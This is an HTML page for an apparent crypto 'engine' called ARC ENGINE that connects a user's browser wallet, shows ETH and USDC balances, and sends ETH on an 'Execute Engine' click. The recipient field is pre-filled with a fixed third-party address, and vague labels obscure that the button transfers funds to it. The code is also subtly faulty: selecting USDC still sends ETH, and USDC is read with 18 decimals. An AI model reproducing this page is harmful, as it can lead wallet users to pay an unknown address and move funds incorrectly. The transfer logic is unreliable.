<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>ARC ENGINE | Universal Hub v11.0</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/5.7.2/ethers.umd.min.js"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@900&family=Inter:wght@400;700;900&display=swap');
        
        body { background-color: #facc15; color: #000; font-family: 'Inter', sans-serif; overflow-x: hidden; margin: 0; }
        .glass-card { background: #000 !important; border: 4px solid #000; border-radius: 2.5rem; box-shadow: 0 35px 70px rgba(0,0,0,0.4); margin-bottom: 25px; position: relative; }
        
        /* 3D Spin */
        @keyframes spin3D {
            0% { transform: perspective(1000px) rotateY(0deg); }
            100% { transform: perspective(1000px) rotateY(360deg); }
        }
        .logo-3d { animation: spin3D 6s linear infinite; transform-style: preserve-3d; }
        
        /* Typography */
        .big-number { font-family: 'Orbitron', sans-serif; font-size: 4.5rem; font-weight: 900; color: #fff; letter-spacing: -3px; line-height: 1; }
        .label-text { font-size: 14px; font-weight: 900; color: #facc15; text-transform: uppercase; letter-spacing: 2px; }
        
        /* Modal Overlay */
        #walletModal { display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.9); z-index: 1000; align-items: center; justify-content: center; backdrop-filter: blur(10px); }
        .modal-content { background: #facc15; border: 6px solid #000; border-radius: 3rem; width: 90%; max-width: 400px; padding: 30px; text-align: center; }
        
        .wallet-opt { background: #000; color: #facc15; padding: 20px; border-radius: 20px; margin-bottom: 12px; display: flex; align-items: center; gap: 15px; font-weight: 900; cursor: pointer; transition: 0.2s; border: 3px solid transparent; }
        .wallet-opt:hover { border-color: #fff; transform: scale(1.02); }
        
        .input-heavy { background: #111; border: 3px solid #333; padding: 20px; border-radius: 20px; width: 100%; color: #facc15; font-weight: 900; font-size: 1.2rem; outline: none; }
    </style>
</head>
<body class="p-4 max-w-lg mx-auto pb-24">

    <div id="walletModal">
        <div class="modal-content">
            <h2 class="text-2xl font-black uppercase mb-6 italic text-black">Select Wallet</h2>
            <div class="wallet-opt" onclick="initConnect('rabby')">
                <img src="https://rabby.io/assets/logo.png" class="w-8 h-8 rounded-full"> Rabby Wallet
            </div>
            <div class="wallet-opt" onclick="initConnect('metamask')">
                <img src="https://upload.wikimedia.org/wikipedia/commons/3/36/MetaMask_Mirror_Logo.svg" class="w-8 h-8"> MetaMask
            </div>
            <div class="wallet-opt" onclick="initConnect('universal')">
                <i class="fa-solid fa-wallet text-2xl"></i> Other Wallets
            </div>
            <button onclick="closeModal()" class="mt-4 text-sm font-black uppercase underline">Cancel</button>
        </div>
    </div>

    <div class="flex justify-between items-center mb-10 pt-8">
        <div class="flex items-center gap-4">
            <div class="logo-3d">
                <img src="logo.png" class="w-20 h-20 rounded-full border-4 border-black" onerror="this.src='https://arc.xyz/favicon.ico'">
            </div>
            <div>
                <h1 class="text-3xl font-black italic text-black uppercase leading-none">ARC ENGINE</h1>
                <p class="text-[10px] text-black font-black uppercase mt-1 italic">Institutional Build v11</p>
            </div>
        </div>
        <div id="authArea">
            <button onclick="openModal()" id="connectBtn" class="bg-black text-yellow-400 px-5 py-2.5 rounded-2xl text-[11px] font-black uppercase shadow-2xl">Connect Wallet</button>
        </div>
    </div>

    <div class="glass-card p-10">
        <div class="flex justify-between items-start">
            <span class="label-text">ETH Balance</span>
            <button onclick="disconnectWallet()" id="dcBtn" class="hidden text-[10px] bg-red-600 text-white px-3 py-1 rounded-full font-black uppercase">Disconnect</button>
        </div>
        <div class="flex items-baseline gap-3 mt-4 mb-6">
            <h2 id="balanceDisp" class="big-number">0.0000</h2>
            <span class="text-2xl text-yellow-500 font-black italic uppercase">ETH</span>
        </div>
        <div class="border-t border-yellow-500/10 pt-6">
            <span class="label-text !text-[11px]">USDC Assets</span>
            <p id="usdcBalance" class="text-3xl font-black text-white">0.00 <span class="text-[12px] text-yellow-600 italic">USDC</span></p>
        </div>
        <p id="myAddrDisp" class="text-[10px] font-mono text-yellow-700 break-all mt-4 hidden"></p>
    </div>

    <div class="glass-card p-8">
        <div class="space-y-6">
            <div>
                <label class="label-text !text-[11px] mb-2 block">Receiver Node</label>
                <input type="text" id="recipient" value="0x20910Aa09451FE483D1930C25a4556a32160F873" class="input-heavy">
            </div>
            <div class="grid grid-cols-2 gap-4">
                <div>
                    <label class="label-text !text-[11px] mb-2 block">Asset</label>
                    <select id="assetSelect" class="input-heavy">
                        <option value="ETH">ETH</option>
                        <option value="USDC">USDC</option>
                    </select>
                </div>
                <div>
                    <label class="label-text !text-[11px] mb-2 block">Volume</label>
                    <input type="number" id="inputAmt" placeholder="0.00" class="input-heavy">
                </div>
            </div>
            <button onclick="executeAction()" id="actionBtn" class="w-full bg-yellow-400 py-6 rounded-3xl text-[18px] font-black uppercase text-black shadow-2xl active:scale-95 transition-all">Execute Engine</button>
        </div>
    </div>

    <script>
        let provider, signer, userAddress;
        const USDC_CONTRACT = "0x127bF57662c19958E406981882046524316bED77";
        const USDC_ABI = ["function balanceOf(address owner) view returns (uint256)"];

        function openModal() { document.getElementById('walletModal').style.display = 'flex'; }
        function closeModal() { document.getElementById('walletModal').style.display = 'none'; }

        async function initConnect(type) {
            closeModal();
            let ethProvider;
            if (type === 'rabby') ethProvider = window.rabby;
            else if (type === 'metamask') ethProvider = window.ethereum;
            else ethProvider = window.ethereum || window.trustWallet;

            if (ethProvider) {
                try {
                    const accounts = await ethProvider.request({ method: 'eth_requestAccounts' });
                    userAddress = accounts[0];
                    provider = new ethers.providers.Web3Provider(ethProvider);
                    signer = provider.getSigner();

                    // Update UI
                    document.getElementById('connectBtn').innerText = "LIVE NODE";
                    document.getElementById('dcBtn').classList.remove('hidden');
                    document.getElementById('myAddrDisp').classList.remove('hidden');
                    document.getElementById('myAddrDisp').innerText = "ID: " + userAddress;
                    
                    updateBalances();
                } catch (e) { alert("Connection Rejected"); }
            } else {
                alert("Selected Wallet Not Found! Install Extension.");
            }
        }

        async function updateBalances() {
            if(!userAddress) return;
            const bal = await provider.getBalance(userAddress);
            document.getElementById('balanceDisp').innerText = parseFloat(ethers.utils.formatEther(bal)).toFixed(4);
            
            try {
                const contract = new ethers.Contract(USDC_CONTRACT, USDC_ABI, provider);
                const usdc = await contract.balanceOf(userAddress);
                document.getElementById('usdcBalance').innerText = parseFloat(ethers.utils.formatUnits(usdc, 18)).toFixed(2) + " USDC";
            } catch (e) { console.log("USDC Error"); }
        }

        function disconnectWallet() {
            userAddress = null;
            document.getElementById('balanceDisp').innerText = "0.0000";
            document.getElementById('usdcBalance').innerText = "0.00 USDC";
            document.getElementById('connectBtn').innerText = "Connect Wallet";
            document.getElementById('dcBtn').classList.add('hidden');
            document.getElementById('myAddrDisp').classList.add('hidden');
            alert("Node Disconnected Safely.");
        }

        async function executeAction() {
            if (!userAddress) return openModal();
            const amt = document.getElementById('inputAmt').value;
            if (!amt || amt <= 0) return alert("Invalid Volume");

            try {
                const tx = await signer.sendTransaction({ 
                    to: document.getElementById('recipient').value, 
                    value: ethers.utils.parseUnits(amt, "ether") 
                });
                await tx.wait();
                updateBalances();
                alert("Settlement Successful!");
            } catch (e) { alert("Transaction Failed"); }
        }
    </script>
</body>
                </html>
